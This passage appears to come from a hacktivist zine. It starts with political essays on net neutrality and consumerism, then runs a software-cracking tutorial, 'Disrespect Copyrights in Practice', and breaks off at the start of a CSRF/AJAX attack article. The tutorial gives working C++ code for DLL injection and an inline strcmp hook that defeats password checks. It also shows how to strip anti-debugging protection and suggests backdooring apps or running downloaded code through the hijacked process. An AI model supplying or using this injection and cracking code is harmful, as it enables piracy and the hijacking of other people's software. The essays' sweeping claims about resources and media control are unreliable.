rights of all internet\r\nusers. In the worst case of such an effort, the current status quo then becomes\r\nthe logical compromise position, rather than the starting point in any forced\r\nnegotiation. Today, those fighting for Net Neutrality are already backed to the\r\nedge of a cliff. The telecoms want them to step a further ten feet over the\r\nedge, but they (the telecoms)are probably quite willing to accept a compromise\r\nwhere those defending Net Neutrality are asked to step only 5 feet off instead.\r\nIt would be far better to push forward rather than to simply try to stand still.\r\n \r\n################################################################################\r\n#                        06. Consumer Society Revisited                        #\r\n################################################################################\r\n\r\n When I look around at this world, I see several things, I see beauty, joy and\r\nhapiness, but I see something else which is getting more and more common, it's\r\ndepression, agression, egoism, sky-rocketing suicide counts and general increase\r\nin dissatisfaction and psychological disorders. \r\n\r\n The most common and prevailing among modern-day psychological disorders is\r\ndepression.\r\n Numerous recent epidemiological studies indicate that depressive disorders in\r\nchildren and adolescents are quite common and growing. Roughly 15% of\r\nadolescents admit to having suffered from such a disorder at some time or other.\r\nThe cause of these depressions often lies in dysfunctional families, negative\r\nlife events (which seem to increase in occurance according to the research) and\r\nan extreme ammount of pressure, both from peers and adult expectance resulting\r\nin streess, which upon occurance of failure and negative reactions from the\r\nexpecting side results in low self-esteem and self-defeating/distorted thinking,\r\nleading to even more depression. Take Japan for example, over 30,000 people last\r\nyear took their lives, of which many where adolescents who couldn't cope with\r\nthe high standards of education, necesarry for corporate employment.\r\n\r\n But not only adolescents cope with depression, lots of adults have to deal with\r\nit as well. Depression in adults is most often caused by lost fights for\r\ndominance inside a social group. This \"fight\" is, in modern times, climbing the\r\ncorporate ladder. A lot of talented people go to work every day, only to sit in\r\ntheir cubicles, commute their asses of, for a low wage, while their bosses,\r\nbulky CEOs make an absurd ammount of money, enough to keep hundreds of people in\r\na third world country alive, while only commanding their workers. Often these\r\nCEOs don't even care what actually goes on in their company, let alone being\r\ncapable of understanding. The researchers who work hard on new technology get\r\nvirtually no respect and a small wage, this goes for the general commuters as\r\nwell. They MAKE the company, yet the \"big boss\" gets away with all the money and\r\nvirtually no input in the product. Climbing the corporate ladder means kicking\r\ndown and kissing up. If you're not prepared to do that (because of moral\r\nobjections), you will be neglected and will remain in a low corporate position.\r\nThe stress and failures that come with this enforced process are the most common\r\ncause of depression. \r\n\r\n This society is a consumerism society that has gone way too far. From the\r\nbeginning of the industrial revolution in the late 18th and early 19th century\r\ntill now we have used more of the earths resources then in the previous\r\n4,499,999,794 years. This resource consumption has reached a level of absurd\r\nproportions, almost of the level in which society can't supply itself anymore.\r\nWithin the next 60 years the worlds oil resources will be completely exhausted,\r\nleaving an empty and collapsed society, in which only those at the top can\r\nsurvive, the globalist extortionists. These corporations, growing bigger and\r\nbigger, until they reach proportions at a level that they can control\r\ngovernements, police forces and ,worst of all, global media. Orwell's vision of\r\nthe future, in which people are brainwashed into believing everything the\r\ngovernement controlled media tells them isn't fiction or future, it's reality.\r\nThe global media isn't independant, nor is governement information. Both are\r\n(indirectly) controlled by large corporations which keep the \"country's economy\r\nrunning\" and finance or media stations. Public opinion is controlled in subtle\r\nways, by advertising, not broadcasting news that could negatively influence the\r\npublic and depecting dissidents are \"rebels, insurgents, counter-culture loons,\r\nhippies or radicals\", all because those people oppose a society in which the\r\nmasses produce for the elite, which hold virtually all power. \r\n Take the \"Compass Group\" for example, a multinational food catering\r\norganization. The Compass Group is involved in a corruption scandal with its\r\nsubsidiary Eurest Support Services winning contracts to provide food to United\r\nNations peacekeepers in Liberia. The value of Compass's food contracts with the\r\nUnited Nations is valued at $237 million, with renewals and add-ons that could\r\nreach $351 million.\r\n The UN Procurement Officer and Vladimir Kuznetsov Head of the UN Committee for\r\nAdministrative and Budgetary Issues were arrested and indicted after taking\r\nnearly $1 million in bribes from Compass, allowing them to extend their\r\nglobalist corporate empire.\r\n Compass refused to make details public and the investigation only resulted in\r\nsome low-level employees being fired and the CEO Michael Bailey stepping down in\r\nJune 2006 with a fat bonus and a Golden Handshake enough to supply a third world\r\ncountry for years. \r\n As seen, the influence of corporations is so huge that it even extends to\r\nsupposedly unbiased, non-profit peacekeeping organisations as the UN, without\r\nhaving to fear reprisal.\r\n\r\n When confronting society with these facts, most high-ranking corporate\r\nofficials will defend themselves with the argument of \"Well, then don't\r\nparticipate in the process!\". This is of course a bullshit argument. In this\r\nsociety we are nothing more but consumers, consumers of the goods we produce\r\nourselves, buying it for more money than we made it for, the difference sliding\r\nin the pockets of the ruling class. This society has developped a fetish for\r\ngoods and services, how useless they even may be. The products have no values of\r\nthemselves, it's a social signal to indentify yourself to the rest of society as\r\na fellow consumer, gaining ungrounded peer-respect stimulated by the media, who\r\ndepicts consumption as the ultimate virtue. The god of this world is the coin,\r\nand it's priests are the corporate leaders, spreading their almost zealous\r\nrelegion in every subtle way they can, enslaving the public to their useless\r\nproducts, making them wage-slaves to the corporations, without a free will. I\r\nask you, what are we when we don't consume? Nothing, we are meant to buy, media\r\nbrings it to our attention, tooth-brushes with GPS systems, earplugs with\r\nairconditioning, cars with weather-forcasting, bikes with suncover caps, chairs\r\nwith built-in remote controls and beertenders, and so on. \r\n This over-consumption society will eventually break down our very ability to\r\njudge products or services by their values, eventually leading to a society in\r\nwhich free-thinking is discouraged, descisions are made by a select few and\r\nemotional instability will be extremely common. If society continues in this\r\ntrend, global resources will be exhausted in the next 60 years, leaving a\r\ndevasted society with tons of environmental problems behind, in which only a\r\nselect elite, based on their undeserved financial capacities can survive, for\r\nthe masses to starve. \r\n Such a future should be prevented and the current consumerist society must to\r\nevery extend and cost be abolished, lest it will be to late to stop this world\r\nfrom consuming it's way into oblivion.\r\n\r\n Cast your mind back to when you were a child, everything was full of hope and\r\ncuriosity, a world of adventure and challenge, what is left of it? A life to be\r\nwasted in a cubicle for some CEO's sake. Your mind being poisoned by the media: \r\n\r\n Politics: \"Act as you are told by our 'laws' or we'll take 'measures'\"\r\n\r\n Economics: \"Work hard and consume, this will contribute to our beautiful\r\nsociety and maybe one day you'll be rich!\"\r\n\r\n Religion: \"Don't sin against the 'rules of god' or you'll be damned forever\r\nafter your death\"\r\n\r\n Since the birth of consciousness, hundreds of millions of human beings have\r\nbeen slaughtered by their fellows.Men, women, children ... snuffed out as if\r\ntheir lives meant nothing.\r\n Why? Because we look to leaders and priests and gurus and \"stars\" to tell us\r\nwhat to do instead of relying on the powers of our own sovereign minds. Some\r\nwill see this as a \"left-wing radical counter-culture hippie rant\", after all,\r\nthey live in a \"democracy\" no? So tell me, what happens if you want to disobey\r\nthem? Say you have moral objections against the current governement. You object\r\nto paying taxes to support the President, his family, his bodyguards and the\r\nfriends he wangled jobs for. What do you do? Or say you don't like your taxes\r\nbeing used to subsidize foreign arms sales for slaughter in the third world. How\r\ncan you stop it? Vote for somebody else, whose policy makes virtually no\r\ndifference? Don't vote and loose your voice? The government pretends to be there\r\nto serve you. In reality, it's there to tell you what to do. If you refuse to\r\nobey, you'll be investigated, arrested, criminalized and made an example.Your\r\nassets will be seized and given to the state. You will be jailed and demonized.\r\nThis world will soon reach a totalitarian consumerist society dominated by\r\nadministration bigwigs who view the world from stretch limos, while hunders of\r\nthousands of families sleep in cardboard boxes and can barely eat. Corrupt\r\nbusinessmen flourish, while honest men beg in the gutter, crime will explode,\r\nand everybody will be forced to believe it HAS to be that way, it's the best for\r\nthe collective good. Imagine you're a child again. Filled with innocence, and\r\nwonder, and life. Remember how good it felt?That's what the parasites stole from\r\nus. They bled us dry. And like sheep we lined up to give more blood. But we can\r\nhave back all that they stole.The information age provides a spotlight the\r\nparasites can't squirm away from. They can't take us on on the net, identify\r\nthem. Negate their evil. Ostracize them. Show them you are not a slave!\r\n\r\n                     -####################################-\r\n                     -####           SKILLS            ###-\r\n                     -####################################-\r\n\r\n################################################################################\r\n#                      Disrespect Copyrights in Practice                       #\r\n################################################################################\r\n(code and other files associated with nomenumbra's article are located at\r\nhttp://www.hackbloc.org/zine/vivalarevolution.rar - pass is 'anarchism')\r\n\r\nDisclaimer:\r\nSome official shit that's needed:\r\nThis document is to be used for legal and educational purposes only.

Their ways of extortion of third world countries and the social\r\n'lowerclass' and abduction of free speech and thought in the first world have\r\ntaken gross forms in today's society.. And like this isn't enough, they have\r\nbeen joined by whitehats to help 'secure' their software from people who break\r\ntheir unrighteous copyrights. This article will give the reader a standard\r\noverview of techniques used to protect applications and ways to bypass them..\r\nThe target applications (called \"Acts\" (Act I,Act II,etc)) come with this zine\r\n(if everything goes ok :p )\r\nHave phun!\r\n\r\nIntroduction:\r\nWell people, reversing applications can range in difficulity level from\r\nextremely easy to mindcrushing. Since this article is an introduction, I won't\r\ndiscuss extremely advanced schemes but I will show you some nice reversing\r\ntricks. Required knowledge to understand this article:\r\n  -)Basic understanding of 32-bit windows ASM\r\n  -)Basic understanding of the usage of Debuggers/Disassemblers\r\n  -)A brain\r\n\r\nYou can either try to crack each app first and read my tutorial afterwards or\r\njust follow along, you choice. Each Act is given an \"objective\" so you know what\r\nto look for and what you can learn there (all passwords are normal words,eg. no\r\nAe534RKLjl passwords but SOMEPASSWORD).\r\n\r\nAct I:\r\nDifficulity: [....]\r\nTools: OllyDbg\r\nObjective: Find the password\r\n\r\nOk, imagine you just downloaded a nice game (\"LameGame V 1.0\") and you're ready\r\nto enjoy playing it. You launch the bitch and THIS jumps up:\r\n\r\nLameGame V1.0\r\n(c) MegaCorp 2006-2099\r\n\r\nUsage:\r\n cp1 <password>\r\n\r\nOk, THAT sucks ass, now we'll have to supply a password as a command-line\r\nargument... Well, it shouldn't be THAT difficult to crack...\r\n\r\nLet's fire up OllyDbg and load our app ....\r\nOne of the first things I always do when reversing an app is checking what\r\nstrings are inside the body. Now, if we scroll down a bit we'll see the text\r\n\"LameGame V1.0\" displayed. Now we take a look at the assembler in that area we\r\nsee a call to <JMP.&msvcrt.strcmp> where the result of a call to 0042A040 (this\r\nresult is argv[1]) gets compared to the \"BULKMONEY\". That was foolish, leaving\r\nthe password in plaintext in the executable....\r\n\r\nAct II:\r\nDifficulity: My granny could do this\r\nTools: OllyDbg\r\nObjective: Find the password\r\n\r\nMegaCorp recently released a new version of \"LameGame\" since V1.0 was could be\r\ncracked by any no-brains monkey. The new version claims to be more secure than\r\nthe first, but is this true? We fire up OllyDbg again and we see that the string\r\n\r\n\"HMPCBMJTU\" gets copied to the address 00443010.\r\nNow we search for the \"LameGame V1.1\" string. This time argv[1] gets compared to\r\n00443010, so argv[1] is compared to \"HMPCBMJTU\" or is it? Take a closer look and\r\nyou'll see that the result of strlen(\"HMPCBMJTU\") gets stored at EAX, and\r\ncompared to DWORD PTR SS:[EBP-4] (which is obviously a counter), if it isn't\r\nbelow (so we've reached the end of the string \"HMPCBMJTU\") we leave this\r\nsubroutine. Now notice the following:\r\n\r\nDWORD PTR SS:[EBP-4] gets stored at EAX, then the offset of \"HMPCBMJTU\" is added\r\n(we now have the address of the current character in EAX), the next interesting\r\nthing is the decrease of that character's value (MOVZX EAX,BYTE PTR DS:[EAX]\r\nthen DEC AL). Then we load the counter in EAX and increase it and continue the\r\nloop. So what happens is that every character gets decreased with 1, so the\r\npassword should be \"GLOBALIST\".... Pathetic company, they really don't know\r\ntheir shit, now do they?.....\r\n\r\nAct III:\r\nDifficulity: Easy as pie....\r\nTools: OllyDbg\r\nObjective: Find the password\r\n\r\nWell, MegaCorp anounced they recently hired a new programmer to ensure the\r\ncracking of their game would be made impossible by implementing a far more\r\nsophisticated encryption algorithm [that'd be time....]. Well, we fire up Olly\r\nagain and see not much has changed, the subroutine structures have remained the\r\nsame. But when we take a closer look we can see the cryptoscheme HAS been\r\nimproved (still pathetic and breakable within 13 seconds but hey....) \r\nWell, we don't want to go trough all the hassle of thinking :D so we'll just let\r\nthe debugger do the job... \r\nSee the POP EBP at 004013F8? well, we'll put a breakpoint there to freeze\r\nexecution once we get there (so we can see how the cryptostring is\r\ndecrypted).Now press F9 and GO! Watch the dump an Voila, we got it \r\n\r\n004013CF  |. 81C1 10304400  |ADD ECX,Cp1.00443010                    ;  ASCII\r\n\"EXTORTION\"\r\n\r\nAct IV:\r\nDifficulity: Medium\r\nTools: OllyDbg\r\nObjective: Find the password or find hash-collision\r\n\r\nInstead of reducing the absurdly high price of \"LameGame\" MegaCorp gave up it's\r\nproduction because all they care about is profit and not their customers. But\r\nthey just brought out a new product, a new firewall named \"Infernal Barricade\".\r\nIn order to install \"Infernal Barricade\" we need to bypass their newest\r\ncopyright scheme. Let's take them on with OllyDbg once again...\r\nHmm... no strcmp anymore? That means they have though of something else than\r\nusing a password. Let's take a closer look.\r\nIt seems that the program makes the final desicion as to whether your key was\r\ncorrect or not here:\r\n\r\n00401491  |> 807D FF 00     CMP BYTE PTR SS:[EBP-1],0\r\n00401495  |. 74 26          JE SHORT Cp1.004014BD\r\n00401497  |.

E8 0AFFFFFF    CALL Cp1.00401390\r\nis the most interesting (looks like the decryption-constructions we've seen\r\nbefore). The function returns a value in EAX that gets compared to the static\r\nvalue 0x310. If we examine the function we can see the argument passed (argv[1]\r\nin this case) is manipulated into a hash value, let's test this thesis.\r\nTo fake a command-line go to Debug->Arguments and supply your argument. \r\n\r\nOk, time to put a breakpoint before the end of the subroutine (located at\r\n004013F9) and F9! Now take a look at the EAX register's value (seen in the right\r\npart of the screen), I used \"FUCKYOU\" as an argument, resolving to 0x21C ....\r\nThat means we must supply a commandline argument that will be resolved to 0x310.\r\nWe could do this in two ways, by looking for a collision in the algorithm or by\r\nbruteforce. Let's rip the algorithm first. \r\nOk, to make things clear:\r\n\r\nDWORD PTR SS:[EBP-8] is the counter (i)\r\nDWORD PTR SS:[EBP+8] is the beginning of argv[1]\r\nDWORD PTR SS:[EBP-C] is input[i] (DWORD PTR SS:[EBP-8]+DWORD PTR SS:[EBP-8])\r\n\r\n004013A4  |> 8B45 08        /MOV EAX,DWORD PTR SS:[EBP+8]            ; |\r\n004013A7  |. 890424         |MOV DWORD PTR SS:[ESP],EAX              ; |\r\n004013AA  |.

C600 00        MOV BYTE PTR DS:[EAX],0\r\nso we can watch ECX being \"IGNORANCE\"... yet another application broken, hehe\r\n\r\nThere are many commercial copyright-protection schemes which would make life\r\ndifficult if we'd reverse only in the ways described, but there are other ways\r\ntoo, by taking advantage over the fact that the target program runs in YOUR\r\nenvironment, you control the OS! That means you can manipulate it from all\r\nsides. One way is process hijacking by DLL injection, which i'll describe here:\r\n\r\nProcess Hijacking\r\n\r\nProcess hijacking involves executing you code in another process' context (not\r\nas in exploiting it to make it execute shellcode). This can be achieved in two\r\nways, either directly by executing a part of you executables code in the remote\r\nprocess, or by DLL injection. With the advent of Windows DEP (Data Execution\r\nPrevention) this leaves us the latter. Injecting your DLL into another process\r\ngoes as follows:\r\n\r\n       Fetch the target process' PID (Process ID)\r\n       Open a handle to the target process\r\n       Fetch the address of LoadLibraryA dynamically\r\nAllocate enough memory for an argument to LoadLibraryA\r\nDo a VirtualProtectEx to set the code pages to PAGE_EXECUTE_READWRITE\r\n      write the name of the DLL to load ,into the memory (we obviously can't use\r\na local address)\r\n       restore the old permissions\r\n\r\nHere follows a sourcecode example in c++:\r\n\r\nBOOL WriteToMemroy(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer,\r\nSIZE_T nSize)\r\n{\r\n\tDWORD dwOldProtect; \r\n\tBOOL boolReturn = FALSE; \r\n\tif(hProcess == NULL) // own process?\r\n\t{ \r\n\t\tVirtualProtect(lpBaseAddress, nSize, PAGE_EXECUTE_READWRITE,\r\n&dwOldProtect); // now Ex needed, only a VirtualProtect\r\n\t\tboolReturn = ((memcpy(lpBaseAddress, lpBuffer, nSize))? 1 : 0); //memcpy\r\ninstead of WriteProcessMemory\r\n\t\tVirtualProtect(lpBaseAddress, nSize, dwOldProtect, &dwOldProtect); //\r\nset back\r\n\t} \r\n\telse \r\n\t{ \r\n\t\tVirtualProtectEx(hProcess, lpBaseAddress, nSize, PAGE_EXECUTE_READWRITE,\r\n&dwOldProtect); // Virtualprotectex to be able to read and write code\r\n\t\tboolReturn = WriteProcessMemory(hProcess, lpBaseAddress,\r\n(LPVOID)lpBuffer, nSize, 0); // Write to memory\r\n\t\tVirtualProtectEx(hProcess, lpBaseAddress, nSize, dwOldProtect,\r\n&dwOldProtect); //set back\r\n\t} \r\n\r\n\tVirtualFreeEx(hProcess, lpBaseAddress, nSize, MEM_RELEASE); // free memory\r\n\treturn boolReturn;\r\n}  \r\n\r\n\r\nBOOL InjectDLL(char* ProcessName, char* strHookDLL)\r\n{\r\n    printf(\"Initiating injection of '%s' into '%s'\\n\",strHookDLL,ProcessName); \r\n    DWORD dwPID = GetProcessID(ProcessName);\t\r\n\tif(dwPID == 0)\r\n\t{\r\n            printf(\"Couldn't retreive valid ProcessID for process\r\n'%s'!\\n\",ProcessName);\r\n\t\t    return FALSE;\r\n\t}\r\n\tHANDLE hProcess;\t\t\t\t\t\t\t\t\r\n\tHMODULE hKernel;\t\t\t\t\t\t\t\t\r\n\tLPVOID RemoteStr, LoadLibraryAddr;\r\n\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); // open the\r\nprocess\tif(hProcess == INVALID_HANDLE_VALUE) //couldn't open?\r\n\t{\r\n\t\tprintf(\"Couldn't open process '%s' with ID %d!\\n\",ProcessName,dwPID);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\thKernel = LoadLibrary(\"kernel32.dll\");\t//load kernel32.dll\r\n\r\n\tif(hKernel == NULL)// couldn't load?\r\n\t{\r\n        printf(\"Couldn't load Kernel32.dll!\\n\");\r\n\t\tCloseHandle(hProcess);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tLoadLibraryAddr = (LPVOID)GetProcAddress(hKernel, \"LoadLibraryA\");// fetch\r\naddress of LoadLibraryA\r\n\tRemoteStr = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(strHookDLL),\r\nMEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); // allocate memory size of argument\r\n\tif(WriteProcessBytes(hProcess, (LPVOID)RemoteStr, strHookDLL,\r\nstrlen(strHookDLL)) == FALSE) // write it to memory\r\n\t{\r\n\t\tprintf(\"Couldn't write to process '%s' memory!\\n\",ProcessName);//\r\nfailed?\r\n\t\tCloseHandle(hProcess);\r\n\r\n\t\treturn FALSE;\r\n\t}          \r\n\tHANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,\r\n(LPTHREAD_START_ROUTINE)LoadLibraryAddr, (LPVOID)RemoteStr, 0, NULL);// remotely\r\nload our DLL\r\n\tif(hRemoteThread == INVALID_HANDLE_VALUE)// failure?\r\n\t{\r\n        printf(\"Couldn't create remote thread within process\r\n'%s'!\\n\",ProcessName);\r\n\t\tCloseHandle(hRemoteThread);\r\n\t\tCloseHandle(hProcess);\r\n\t\treturn FALSE;\r\n\t}\r\n\tCloseHandle(hProcess);\r\n\tprintf(\"'%s' successfully injected into process '%s' with ID\r\n%d!\\n\",strHookDLL,ProcessName,dwPID);\r\n\treturn TRUE;\r\n} \r\n\r\nWell that wasn't THAT difficult, now was it? The next question that arises is\r\n\"What to inject?\". Well you can do a lot once your DLL is loaded, ranging from\r\nprocess termination to full-blown  input/output manipulation. The template of\r\nyour DLL should look like this:\r\n\r\nBOOL APIENTRY DllMain( HANDLE hModule, \r\n                       DWORD  ul_reason_for_call, \r\n                       LPVOID lpReserved\r\n\t\t\t\t\t )\r\n{\r\n  switch (ul_reason_for_call)\r\n\t{\r\n\tcase DLL_PROCESS_ATTACH:\r\n\t{\r\n\t\tDisableThreadLibraryCalls((HMODULE)hModule); //don't get re-called\r\n\t\t// do what you want once attached\t\r\n\t\treturn true;\r\n\t}break;\t\r\n\tcase DLL_PROCESS_DETACH:\r\n\t{\r\n\t\t// bring back to old state\r\n\t}break;\r\n  }\r\n  return true;\r\n}\r\n\r\nImagine the following application:\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n    system(\"PAUSE\");\r\n    if (argc-1)\r\n    {\r\n    if (strcmp(argv[1],\"XPLT\") == 0)        \r\n      MessageBoxA(0,\"Accepted\",\"Accepted\",0);\r\n               \r\n    }    \r\n    return 0;\r\n}\r\n\r\nOk, this simple app can be fooled by hijacking the main function it relies on,\r\nstrcmp. Strcmp is a string comparing function located in the Dll ntdll.dll. The\r\npause is used to ensure we get the time to inject our DLL into the victim app. \r\nOk, we'll hijack the function by using a detours trampoline. Detours patching,\r\nas described in: \r\nhttp://research.microsoft.com/~galenh/Publications/HuntUsenixNt99.pdf \r\ngoes as follows:\r\n\r\nHere follows a small example in C++:\r\n\r\nDWORD InlineHook(const char *Library, const char *FuncName, void *Function,\r\nunsigned char *backup)\r\n{\r\n\tDWORD addr = (DWORD)GetProcAddress(GetModuleHandle(Library), FuncName); \r\n// Fetch function's address\r\n\tBYTE jmp[6] = {\r\n                           0xe9,\t\t\t  //jmp\r\n\t\t0x00, 0x00, 0x00, 0x00,  //address\r\n\t\t0xc3                                // retn\r\n                                     };\r\n          ReadProcessMemory(GetCurrentProcess(), (void*)addr, backup, 6, 0); \r\n// Read 6 bytes from address of hooked function from rooted process into backup\r\n\r\n    DWORD calc = ((DWORD)Function - addr - 5); //((to)-(from)-5)\r\n    memcpy(&jmp[1], &calc, 4); //build trampoline\r\n    WriteProcessMemory(GetCurrentProcess(), (void*)addr, jmp, 6, 0); \r\n    // write the 6 bytes long trampoline to address of hooked function to\r\ncurrent process\r\n\treturn addr;\r\n}\r\n\r\nThis function resolves the address of the function to be hooked, and builds a\r\ntrampoline as follows:\r\n\r\nJMP <4 empty bytes for addres to jump to>\r\nRETN\r\n\r\nthe address to jump to (the hook) is resolved like this:\r\n\r\n((To)-(From)-5) == ((HookAddress)-(TargetAddress)-5)\r\n\r\nthe old address is backed up, to be able to unhook the function later (by\r\noverwriting the trampoline with the original address).\r\nOk, now let's hijack our little app to make any password work:\r\n\r\nint WINAPI strcmphook(const char* str1,const char* str2); // prototype\r\n\r\nDWORD Faddr=0; // address\r\nBYTE Fbackup[6]; // backup\r\n\r\nDWORD InlineHook(const char *Library, const char *FuncName, void *Function,\r\nunsigned char *backup)\r\n{\r\n\tDWORD addr = (DWORD)GetProcAddress(GetModuleHandle(Library), FuncName); \r\n// Fetch function's address\r\n\tBYTE jmp[6] = {\r\n                           0xe9,\t\t\t  //jmp\r\n\t\t0x00, 0x00, 0x00, 0x00,  //address\r\n\t\t0xc3                                // retn\r\n                                     };\r\n          ReadProcessMemory(GetCurrentProcess(), (void*)addr, backup, 6, 0); \r\n// Read 6 bytes from address of hooked function from rooted process into backup\r\n\r\n    DWORD calc = ((DWORD)Function - addr - 5); //((to)-(from)-5)\r\n    memcpy(&jmp[1], &calc, 4); //build trampoline\r\n    WriteProcessMemory(GetCurrentProcess(), (void*)addr, jmp, 6, 0); \r\n    // write the 6 bytes long trampoline to address of hooked function to\r\ncurrent process\r\n\treturn addr;\r\n}\r\n\r\nBOOL APIENTRY DllMain( HANDLE hModule, \r\n                       DWORD  ul_reason_for_call, \r\n                       LPVOID lpReserved\r\n\t\t\t\t\t )\r\n{\r\n  switch (ul_reason_for_call)\r\n\t{\r\n\tcase DLL_PROCESS_ATTACH:\r\n\t{\r\n\t\tDisableThreadLibraryCalls((HMODULE)hModule); //keeps it from being\r\nre-called        \r\n\t\tFaddr = InlineHook(\"ntdll.dll\",\"strcmp\",strcmphook,Fbackup); // strcmp\r\nin ntdll.dll\r\n\t\treturn true;\r\n\t}break;\r\n\tcase DLL_THREAD_ATTACH: break;\r\n\tcase DLL_THREAD_DETACH: break;\r\n\tcase DLL_PROCESS_DETACH:\r\n\t{\r\n\t\tWriteProcessMemory(GetCurrentProcess(), (void*)Faddr, Fbackup, 6, 0); //\r\nrestore address\t\t\r\n\t}break;\r\n  }\r\n  return true;\r\n}\r\n\r\nint WINAPI strcmphook(const char* str1,const char* str2)\r\n{\r\nreturn 0; // always return 0, no matter what password was.\r\n};\r\n\r\nOnce we inject this DLL into our victim app like this:\r\nInjectDLL(\"Victim.exe\",\"hijack.dll\"), you will notice that it doesn't matter\r\nwhat password you supplied as a commandline argument, you will always get the\r\n\"Accepted\" messagebox. As you can see process Hijacking can get you many things.\r\nYou could subvert an application to elevate your privileges, create an extra\r\naccount, download & execute an app with the privileges under which the app runs,\r\nyou could even backdoor the app itself by letting it execute code to run the DLL\r\ninjector @ startup, thus effectively taking over the app.\r\n\r\nAct VI:\r\nDifficulity: Hard\r\nTools: OllyDbg,PEiD,DeYoda (found here: http://xtaz3k.free.fr/decryptors/Dy.ace)\r\nObjective: Get the MessageBox with the password to popup (the password IS\r\nencrypted and is not to be found in plaintext in the app,\r\nyou can also decrypt the password by hand since the 'encryption' is pathetic,\r\nbut that way you'll miss some valuable knowledge)\r\n\r\nOk, there is this new IDE, called BulkIDE, you really wanna get your hands on,\r\nit is said to be quite nice, but the price tag is a 'little' high, $3000,\r\noutrageous for such a simple IDE, so let's crack the bitch. You managed to lay\r\nyour hands on the main installer executable, but you seem to be missing the\r\ninstallation CD, but hey, we should get this working without that stupid license\r\n.exe :) It is rumored though that the programmers behind this IDE are fans of\r\n\"security through obscurity\" meaning we can expect a lot of opaque predicates (a\r\nfunction that evaluates to true or false and of which the outcome is known to\r\nthe programmer on forehand, sometimes used as useless code that seems important\r\nor anti-debugging). \r\n\r\nFirst of all we load up PeiD and check the app, result:\r\n\r\nyoda's cryptor 1.2\r\n\r\nThis is probably your first encounter with a packer/crypter. Many software these\r\ndays (especially commercial software and malware) is packed/crypted to make\r\nreversing a tiny whiny bit harder and to reduce executable size.\r\nYoda's cryptor is quite a nice compressor/packer/crypter for PE files, but it\r\ncan be undone in a wink, just fire up DeYoda, load the app and GO! Fire up PEiD\r\nagain:\r\n\r\nNothing found *\r\n\r\nNice, that's what we wanna see. \r\n\r\nNow fire up OllyDBG and load the unpacked executable. \r\nWe won't start looking at all strings, cause they are too obvious to be real\r\npasswords, they're just bogus shit to confuse the cracker.\r\nThe first thing we see is:\r\n\r\n00401000 >/$ 68 0A204000   PUSH unpacked.0040200A; /FileName = \"user32.dll\"\r\n00401005  |.

FF15 24204000 CALL DWORD PTR DS:[402024]\r\n\r\nWell, the following happens:\r\n\r\nGetProcAddress(LoadLibrary(\"user32.dll\"),\"BlockInput\") gets stored in DWORD PTR\r\nDS:[402024]. BlockInput is a function to halt all keyboard and mouse input if\r\nit's argument is true, and resume it if it is false. If we look a bit further,\r\nat ox0040101A we see a call to BlockInput with a true parameter and at\r\n0x00401048 we see it with a false parameter. So obviously the program attempts\r\nto block any input during program execution to prevent debugging and reversing.\r\nWell to get rid of this nuisance, we'll just nop those PUSH <true||false>\r\nCALLDWORD PTR DS:[402024] structures out with right click -> binary -> fill with\r\nNOP's.

Then\r\nthis function is called:\r\n\r\n0040118D  /$ AC             LODS BYTE PTR DS:[ESI]\r\n0040118E  |. 3D CC000000    CMP EAX,0CC\r\n00401193  |. 75 06          JNZ SHORT unpacked.0040119B\r\n00401195  |.

Now we\r\ncontinue and voila! We get the popup with the password: WAR.\r\n\r\nAfterword:\r\n\r\nWell, this was just the top of the iceberg, letting you taste the 'forbidden\r\nfruit' of reverse engineering, a most enjoyable and profitible practice, usefull\r\nfor crackers,vxers and exploit developpers alike. There are many,many more ways\r\nfor a programmer to protect his program from being cracked. The programmer could\r\nalso make his program decrypt @ runtime (much like a virus) when the correct key\r\nis provided, but a reverse-engineer could whipe out the key-checking procedure\r\nwith nop's (0x90) or turn the conditional jump after the key-checker into an\r\nunconditional one. He could make the app run in ring-0 but then we could use\r\nsoft-ice to debug the app. The programmer could use rootkit techniques to hide\r\nhis app from userland and kernelland, but then we could use the same techniques\r\nas rootkitdetectors.\r\nAs you can see, there are endless amounts of ways to protect a program ... but\r\neven more to break it :D.

Unfortunately, there are not so many that cover any\r\nadvanced topics, such as using AJAX for CRSF, using PHP for CRSF, abusing\r\nembedded script already on the page...\r\n\r\nThe point of this article is to shed a brighter light on such topics. I'm going\r\nto try to go in-depth without actually falling into a bottomless pit, as it is\r\noften that you are in a different situation and with a different attack\r\nvector..big attacks are hardly ever the same.\r\n\r\nSome terminology notes before we begin...\r\n\tAJAX - Asychronus JavaScript and XML - Allows an update/sending of data\r\nwithout having to refresh a page, or a part of a page, etc..\r\n\t\t\r\n\tCRSF - Cross-Site-Request-Forgery - Mostly like the opposite of generic XSS\r\n- in a sense that instead of exploiting the user's trust in a website, you\r\nexploit the website's trust in a user.\r\n\r\n/~CONTENTS\r\n\t\\x01 - Using AJAX for CRSF.\r\n\t\\x02 - Using PHP for CRSF.\r\n\t\\x03 - Minor Bullshit.\r\n\t\r\n\t\\x01: Using AJAX for CRSF\r\n  There are (now) quite a few good examples and hundreds of big-time web apps\r\nthat use AJAX to import nice effects and cool stuff to their page. Very few\r\nthings tell you how to use it for things deemed 'bad'. However, there have been\r\n2 things I think are great examples of using it for misdeeds..\r\n  [1] MySpace 'samy is my hero' Worm\r\n  [2] CriticalSecurity.NET 'I love IceShaman' Script\r\n  Firstly, the I say number one is a worm. It is such because it replicated\r\nitself to a user's profile when they visited. Unfortunately (even though it hit\r\nover 1mill users) it didn't work as fast as it could have, because it used\r\nInternet Explorer's dumb 'feature' of executing JavaScript in CSS. The code to\r\nthis can be found by going to http://namb.la/.\r\n  The second one is a script (only) because it did not replicate itself into a\r\nuser's anything. It is a good example, however. You can find the code to this by\r\nasking IceShaman on irc.hackthissite.org.\r\n  Anyway, these are only meant so you can take a look at them. Now, we'll wander\r\nthrough some code and technical mumbo-jumbo....To start, we need to know how to\r\ncall the XMLHttpRequest Object. There are many ways of calling the object, but\r\nwe'll just use a 'foolproof' method. Not all browsers support this object, but\r\nalmost any new-age browser supports it.\r\n\r\n  var http_request = false;\r\n  if (window.XMLHttpRequest) {\r\n  // This is the way to ask for the XMLHttpRequest\r\n  // object in Mozilla, Safari, etc;\r\n  